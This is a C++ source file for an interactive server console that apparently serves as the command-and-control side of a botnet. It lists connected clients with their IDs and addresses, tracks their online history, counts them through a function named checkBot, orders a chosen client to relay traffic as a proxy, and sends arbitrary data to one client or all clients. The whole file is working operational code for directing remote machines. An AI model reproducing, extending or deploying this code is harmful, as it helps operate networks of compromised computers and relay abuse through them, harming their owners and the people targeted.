#include <iostream>
#include "include/socket/server_socket.h"
#include "include/crypto/sha256.h"

int32_t main(int32_t argc, char **argv) {
    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <port>" << std::endl;

        return -1;
    }

    uint16_t port = std::stoi(argv[1]);

    sys::SocketServer server(port);

    server.setThreadType(sys::ThreadMode::single_thread);
    server.setType(sys::SocketType::tcp_socket);

    server.socketInit();

    std::thread([&]() -> void {
        while (server.socketListenConnection());

        std::cout << "Server shutdown, accept error" << std::endl;
        exit(0);
    }).detach();

    std::string sh;

    while (true) {
        std::cout << "command> ";
        std::cin >> sh;

        if (sh == "getClients") {
            std::vector<std::string> CID;
            std::vector<sys::ClientConnectionData> clients;

            if (server.getCID().size() > 0) {
                CID = server.getCID();
                clients = server.getClients();
            }

            if (CID.size() != clients.size())
                std::cout << "List broken" << std::endl;

            else {
                for (int32_t i = 0; i < CID.size(); i++) {
                    if (clients.at(i).proxy_hint) {
                        std::cout << "_______________" << std::endl
                                  << "ClientId: " << CID.at(i).data() << " - proxy_hint_detected" << std::endl
                                  << "ClientAddress: " << clients.at(i).host                         << std::endl;
                    }

                    else
                        std::cout << "_______________"                          << std::endl
                                  << "ClientId: " << CID.at(i).data()        << std::endl
                                  << "ClientAddress: " << clients.at(i).host << std::endl;
                }
            }
        }

        if (sh == "getHistory") {
            std::vector<std::string> CID;
            std::vector<sys::ClientConnectionData> clients;

            if (server.getCID().size() > 0)
                clients = server.getHistory();

            for (int i = 0; i < clients.size(); i++)
                CID.push_back(clients.at(i).CID);

            if (CID.size() != clients.size())
                std::cout << "List broken" << std::endl;

            else {
                for (int32_t i = 0; i < CID.size(); i++) {
                    if (clients.at(i).proxy_hint) {
                        if (clients.at(i).is_online)
                            std::cout << "_______________" << std::endl
                                      << "ClientId: "      << CID.at(i).data()    << " - proxy_hint_detected" << std::endl
                                      << "ClientAddress: " << clients.at(i).host  << " - [ONLINE]"            << std::endl;

                        else
                            std::cout << "_______________" << std::endl
                                      << "ClientId: "      << CID.at(i).data()    << " - proxy_hint_detected" << std::endl
                                      << "ClientAddress: " << clients.at(i).host  << " - [DISCONNECTED]"      << std::endl;
                    }

                    else {
                        if (clients.at(i).is_online)
                            std::cout << "_______________" << std::endl
                                      << "ClientId: "      << CID.at(i).data()                                << std::endl
                                      << "ClientAddress: " << clients.at(i).host  << " - [ONLINE]"            << std::endl;

                        else
                            std::cout << "_______________" << std::endl
                                      << "ClientId: "      << CID.at(i).data()                                << std::endl
                                      << "ClientAddress: " << clients.at(i).host  << " - [DISCONNECTED]"      << std::endl;
                    }
                }
            }
        }

        if (sh == "proxyEnable") {
            uint32_t _CID = 0;

            int count = 0;

            for (const auto& CID : server.getCID()) {
                std::cout << count << ". " << CID.data() << std::endl;

                ++count;
            }

            std::cout << "CID> ";
            std::cin >> _CID;

            if (_CID >= server.getCID().size() || _CID < 0)
                std::cout << "Invalid CID" << std::endl;

            else {
                std::string connection_string;

                sockaddr_in keep_host;

                keep_host.sin_addr.WIN(S_un.S_addr)LINUX(s_addr) = server.getClients().at(_CID).host;

                connection_string.push_back(PROXY_MESSAGE);
                connection_string += inet_ntoa(keep_host.sin_addr);
                connection_string.push_back(':');
                connection_string += std::to_string(server.getClients().at(_CID).port);

                if (!server.sendBy(server.getCID().at(_CID), connection_string))
                    std::cout << "Proxy don't enabled: send connection string failed" << std::endl;
            }
        }

        if (sh == "getCID")
            for (const auto& CID : server.getCID())
                std::cout << "_______________" << std::endl
                          << CID.data()        << std::endl;

        if (sh == "check")
            std::cout << "Active clients: " << server.checkBot() << std::endl;

        if (sh == "send") {
            uint32_t CID = 0;

            int count = 0;

            for (const auto& CID_id : server.getCID()) {
                std::cout << count << ". " << CID_id.data() << std::endl;

                ++count;
            }

            std::cout << "CID> ";
            std::cin >> CID;

            if (CID >= server.getCID().size() || CID < 0)
                std::cout << "Invalid CID" << std::endl;

            else {
                std::string data;

                std::cout << "data> ";
                std::cin >> data;

                if (!server.sendBy(server.getCID().at(CID), data))
                    std::cout << "Send error" << std::endl;

                else
                    std::cout << "Message delivered" << std::endl;
            }
        }

        if (sh == "sendAll") {
            std::string data;

            std::cout << "data> ";
            std::cin >> data;

            uint64_t failed = server.sendAll(data);

            std::cout << "Message delivered" << "\n\tFails: " << failed << std::endl;
        }
    }
}